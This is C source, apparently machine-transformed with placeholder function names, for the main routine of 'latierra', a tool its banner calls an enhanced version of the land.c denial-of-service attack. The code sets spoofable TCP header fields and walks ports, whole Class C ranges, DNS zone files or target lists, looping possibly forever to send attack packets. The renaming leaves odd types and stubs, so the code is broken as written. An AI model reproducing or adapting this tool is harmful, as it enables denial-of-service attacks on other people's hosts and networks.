#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
struct TYPE_3__ {int tcp_flags; int window_size; int ip_protocol; int sequence_number; int ttl; char* dest_ip; void* supress_output; void* message_type; } ;
typedef  TYPE_1__ LATIERRA_DATA ;
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 int DEFAULT_FREQUENCY ; 
 int DEFAULT_SEQ ; 
 int DEFAULT_TCPFLAGS ; 
 int DEFAULT_TTL ; 
 int DEFAULT_WINSIZE ; 
 int EOF ; 
 void* FALSE ; 
 int FOR_EVER ; 
 int IP_TCP ; 
 int LIST_FILE ; 
 int TH_ACK ; 
 int TH_FIN ; 
 int TH_PUSH ; 
 int TH_RST ; 
 int TH_SYN ; 
 int TH_URG ; 
 void* TRUE ; 
 int ZONE_FILE ; 
 scalar_t__ FUNC0 (char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC1 () ; 
 void* FUNC2 (int*) ; 
 int /*<<< orphan*/ * FUNC3 (char*,char*) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ ,char*) ; 
 int /*<<< orphan*/  FUNC5 (int,int /*<<< orphan*/ *,char*) ; 
 int FUNC6 (int,char**,char*) ; 
 scalar_t__ FUNC7 (TYPE_1__*,int) ; 
 int /*<<< orphan*/  FUNC8 () ; 
 int* optarg ; 
 int /*<<< orphan*/  FUNC9 () ; 
 int /*<<< orphan*/  FUNC10 (char*,...) ; 
 int /*<<< orphan*/  FUNC11 () ; 
 int /*<<< orphan*/  FUNC12 (int) ; 
 int /*<<< orphan*/  FUNC13 (char*,char*,char*,int) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  FUNC14 (char*,char*) ; 
 int /*<<< orphan*/  FUNC15 (char*,char*) ; 
 int /*<<< orphan*/  FUNC16 (char*,...) ; 
 int FUNC17 (int*) ; 
 scalar_t__ FUNC18 (int*,char*,int) ; 

int FUNC19(int argc, char **argv)
{
	FILE *fp;
	LATIERRA_DATA ld;
	int frequency = DEFAULT_FREQUENCY, x;
	int beginning_port=1, octet=1, scan_loop=0, loop_val=0, use_file=FALSE;
	int ending_port = 0, loop = TRUE, i = 0, increment_addr = FALSE;
   char got_ip = FALSE, got_beg_port = FALSE;
	char class_c_addr[21], filename[256], buff[512], valid_tcp_flags[16];

	FUNC10("\nlatierra v1.0b by MondoMan (elmondo@usa.net), KeG\n");
   FUNC10("Enhanced version of land.c originally developed by m3lt, FLC\n");

	FUNC16(valid_tcp_flags, "fsrpau");
	ld.tcp_flags = 0;
	ld.window_size = DEFAULT_WINSIZE;
	ld.ip_protocol = IP_TCP;
	ld.sequence_number = DEFAULT_SEQ;
	ld.ttl = DEFAULT_TTL;
	ld.message_type = 0;
	
	if(argc > 1 && (!FUNC15(argv[1], "-a")))
		FUNC1();

	if(argc > 1 && (!FUNC15(argv[1], "-n")))
		FUNC8();

	if(argc > 1 && (!FUNC15(argv[1], "-p")))
		FUNC11();

	if(argc == 1 || ( (argc >= 2) && (!FUNC15(argv[1], "-h"))))
		FUNC9();

	while((i = FUNC6(argc, argv, "i:b:e:s:l:o:t:w:p:q:v:m:")) != EOF)
		{
		switch(i)
			{	
			case 't':
				for(x=0;x<FUNC17(optarg);x++)
					switch(optarg[x])
						{
						case 'f':                        /* fin */
							ld.tcp_flags |= TH_FIN;
							break;
						case 's':                        /* syn */
							ld.tcp_flags |= TH_SYN;
							break;
						case 'r':                        /* reset */
							ld.tcp_flags |= TH_RST;
							break;
						case 'p':                        /* push */
							ld.tcp_flags |= TH_PUSH;			
							break;
						case 'a':                        /* ack */
							ld.tcp_flags |= TH_ACK;
							break;
						case 'u':                        /* urgent */
							ld.tcp_flags |= TH_URG;
							break;
						default:
							FUNC10("\nERROR: Invalid option specified [ %c ] for tcp_flags.\n\n", optarg[x]);
							return(-12);
							break;
						}
				break;
			case 'q':
				ld.sequence_number = FUNC2(optarg);
				break;
			case 'w':
				ld.window_size = FUNC2(optarg);
				break;
			case 'm':
				ld.message_type = FUNC2(optarg);
				break;
			case 'v':
				ld.ttl = FUNC2(optarg);
				break;
			case 'p':
				ld.ip_protocol = FUNC2(optarg);
				break;
			case 'o':
				ld.supress_output = TRUE;
				break;
			case 'i':
				if(FUNC17(optarg) > 1)
					FUNC16(ld.dest_ip, optarg);
				else
					{
					FUNC10("ERROR: Must specify valid IP or hostname.\n");
					return(-6);
					}
				got_ip = TRUE;
				break;
			case 's':
				frequency = FUNC2(optarg);	
				break;
			case 'l':
				loop = FUNC2(optarg);
				break;
			case 'b':
				beginning_port = FUNC2(optarg);
				got_beg_port = TRUE;
				break;
			case 'e':
				ending_port = FUNC2(optarg);
				break;
			}
		}

	if(!ld.tcp_flags)
		ld.tcp_flags = DEFAULT_TCPFLAGS;

	if(!got_beg_port)
		{
		FUNC4(stderr, "\nMust specify beginning port number.  Use -h for help with arguments.\n\n");
		return(-7);
		}

	if(ending_port == 0)
		ending_port = beginning_port;

	FUNC10("\nSettings:\n\n");

   FUNC10("  (-i)   Dest. IP Addr   : ");

	if(ld.dest_ip[FUNC17(ld.dest_ip) -1] == '-')
		{
		ld.dest_ip[FUNC17(ld.dest_ip)-1] = 0x0;
		FUNC16(class_c_addr, ld.dest_ip);
		FUNC14(ld.dest_ip, "1");
		FUNC10(" %s (Class C range specified).\n", ld.dest_ip);
		increment_addr = TRUE;
		octet = 1;
		}
	else
		if(FUNC17(ld.dest_ip) > 5)
			{
			if(FUNC18(ld.dest_ip, "zone=", 5)==0)
				{
				FUNC16(filename, &ld.dest_ip[5]);
				FUNC10("%s (using DNS zone file)\n", filename);
				use_file = ZONE_FILE;
				}	
			else if(FUNC18(ld.dest_ip, "list=", 5) == 0)
				{
				FUNC16(filename, &ld.dest_ip[5]);
				FUNC10("%s (using ASCII list)\n", filename);
				use_file = LIST_FILE;
				}
			else
				FUNC10("%s\n", ld.dest_ip);
			}
		else 
			{
			FUNC10("Destination specifier (%s) length must be > 7.\n", ld.dest_ip);
			return(-9);
			}

	FUNC10("  (-b)   Beginning Port #: %d\n",     beginning_port );
	FUNC10("  (-e)   Ending Port #   : %d\n",     ending_port );
	FUNC10("  (-s)   Seconds to Pause: %d\n",     frequency );
	FUNC10("  (-l)   Loop            : %d %s\n",  loop, (loop == FOR_EVER) ? "(forever)" : " " );
	FUNC10("  (-w)   Window size     : %d\n",     ld.window_size );
	FUNC10("  (-q)   Sequence Number : %X (%d)\n",ld.sequence_number, ld.sequence_number );
	FUNC10("  (-v)   Time-to-Live    : %d\n",     ld.ttl);
	FUNC10("  (-p)   IP Protocol #   : %d\n",     ld.ip_protocol );
	FUNC10("  (-t)   TCP flags       : "); 

	FUNC16(buff, "");

	if( ld.tcp_flags & TH_FIN)
		FUNC14(buff, "fin ");
	if( ld.tcp_flags & TH_SYN)
		FUNC14(buff, "syn ");
	if(ld.tcp_flags & TH_RST)
		FUNC14(buff, "rst ");
	if(ld.tcp_flags & TH_PUSH)
		FUNC14(buff, "push ");
	if(ld.tcp_flags & TH_ACK)
		FUNC14(buff, "ack ");
	if(ld.tcp_flags & TH_URG)
		FUNC14(buff, "urg ");

	FUNC10("%s\n\n", buff);
			
	if(ending_port < beginning_port)
		{
		FUNC10("\nERROR: Ending port # must be greater than beginning port #\n\n");
		return(-8);
		}
	
	scan_loop = loop_val = loop;
	
	if(use_file)
		{
		if(FUNC0(filename, 0))
			{
			FUNC10("\nERROR: The file you specified (%s) cannot be found.\n\n", filename);
			return(-9);
			}

		if( (fp = FUNC3(filename, "rt")) == NULL)
			{
			FUNC10("ERROR: Unable to open %s.\n", filename);
			return(-10);
			}

		if(!FUNC5(use_file, fp, buff))
			{
			FUNC10("Unable to get any IP address from file %s.\n");
			return(-11);
			}

		FUNC16(ld.dest_ip, buff);
		}
	
	while( (loop == FOR_EVER) ? 1 : loop-- > 0)
		{
		for(i=beginning_port; i <= ending_port; i++)
			{
			if(FUNC7(&ld, i))        /* go for it BaBy! */
				break;

   		if(frequency)          /* make sure freq > 0 */
			 	{
				if(!ld.supress_output)
					FUNC10("-> paused %d seconds.\n", frequency);
				FUNC12(frequency);
				}
			}

		if( (!use_file) && (loop && increment_addr) )
			{
			char temp_addr[21];

			if(++octet > 254)                        /* check for reset */
				{
				if(loop_val != FOR_EVER)              /* make sure not to distrute forever! */
					{
					if(++scan_loop > loop_val)        /* check if scanned x times */
						break;
					else
						loop = loop_val;                /* restore original value */
					}
				octet = 1;	                          /* reset */
				}

			FUNC13(temp_addr, "%s%d", class_c_addr, octet);
			FUNC16(ld.dest_ip, temp_addr);
		
			if(!ld.supress_output)
				FUNC10("** incrementing to next IP address: %s\n", ld.dest_ip);

			if(scan_loop > loop_val)
				break;	/* break while loop */
			}
		else if(use_file)
			{
			if(!FUNC5(use_file, fp, buff))
				break;
		
			loop++;

			FUNC16(ld.dest_ip, buff);
			}

		} /* end while */

	FUNC10("\nDone.\n\n");
}